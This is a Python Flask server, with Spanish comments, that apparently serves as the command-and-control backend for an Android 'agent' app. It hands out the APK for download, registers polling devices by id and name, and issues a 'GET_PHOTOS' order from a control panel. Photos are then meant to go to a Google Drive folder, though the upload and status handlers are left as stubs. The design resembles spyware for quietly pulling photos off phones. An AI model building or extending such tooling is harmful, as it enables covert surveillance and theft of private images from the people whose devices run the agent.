import os
import json
import base64
import uuid
from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime
from pydrive2.auth import GoogleAuth
from pydrive2.drive import GoogleDrive
from io import BytesIO
from google.oauth2.service_account import Credentials

# --- CONFIGURACIÓN ---
DRIVE_FOLDER_ID = '1Tux8uqv--gJjUc9_HrSZZEHsRyuzdJGO'
DEVICES_DB_FILE = 'devices.json'
app = Flask(__name__)
drive = None
# Usaremos una variable global para la orden, es más simple para Render
pending_command = None 

# --- Funciones de Datos ---
def load_data(filepath, default_data):
    if not os.path.exists(filepath): return default_data
    try:
        with open(filepath, 'r') as f: return json.load(f)
    except Exception: return default_data
def save_data(filepath, data):
    with open(filepath, 'w') as f: json.dump(data, f, indent=4)

# --- Autenticación (No cambia) ---
def authenticate_gdrive():
    # ... (la función de autenticación que ya funciona) ...
    secrets_json_str = os.environ.get('GOOGLE_CLIENT_SECRETS')
    if not secrets_json_str: raise Exception("Var de entorno GOOGLE_CLIENT_SECRETS no encontrada.")
    secrets_dict = json.loads(secrets_json_str)
    credentials = Credentials.from_service_account_info(secrets_dict, scopes=['https://www.googleapis.com/auth/drive'])
    gauth = GoogleAuth(); gauth.credentials = credentials
    return GoogleDrive(gauth)

# --- Endpoints ---

@app.route('/')
def serve_index(): return send_from_directory('.', 'index.html')

@app.route('/download/agent')
def download_agent_apk():
    try: return send_from_directory('public', 'app-debug.apk', as_attachment=True)
    except FileNotFoundError: return "APK no encontrado.", 404

# --- LÓGICA DE COMANDOS CORREGIDA ---
@app.route('/trigger-fetch', methods=['POST'])
def trigger_fetch_from_panel():
    global pending_command
    pending_command = "GET_PHOTOS"
    print("[SERVER] Orden 'GET_PHOTOS' recibida y activada.")
    return jsonify({"status": "success"})

@app.route('/get-command')
def get_command_for_agent():
    global pending_command
    device_id = request.args.get('deviceId')
    device_name = request.args.get('deviceName', 'Dispositivo Desconocido')
    
    if not device_id: return jsonify({"command": "NONE"}), 400

    devices = load_data(DEVICES_DB_FILE, {})
    devices.setdefault(device_id, {'status': 'active'})['name'] = device_name
    devices[device_id]['last_seen'] = str(datetime.now())
    save_data(DEVICES_DB_FILE, devices)
    
    if devices[device_id]['status'] == 'paused': return jsonify({"command": "NONE"})

    # Lógica de entrega de comando simplificada
    if pending_command:
        command_to_send = pending_command
        pending_command = None # Reseteamos la orden una vez entregada
        print(f"[SERVER] Entregando orden '{command_to_send}' a {device_name}")
        return jsonify({"command": command_to_send})
        
    return jsonify({"command": "NONE"})

# --- PARA EL PANEL DE CONTROL (No cambia) ---
@app.route('/get-devices', methods=['GET'])
def get_devices(): return jsonify(load_data(DEVICES_DB_FILE, {}))
@app.route('/toggle-status', methods=['POST'])
def toggle_status():
    # ... (código que ya funciona) ...
    pass

# --- UPLOAD A DRIVE (No cambia) ---
@app.route('/upload', methods=['POST'])
def upload_to_drive():
    # ... (código que ya funciona) ...
    pass

# --- INICIALIZACIÓN ---
with app.app_context():
    try:
        drive = authenticate_gdrive()
        print("Autenticación con Google Drive exitosa al arrancar.")
    except Exception as e:
        print(f"ERROR CRÍTICO AL ARRANCAR: {e}")
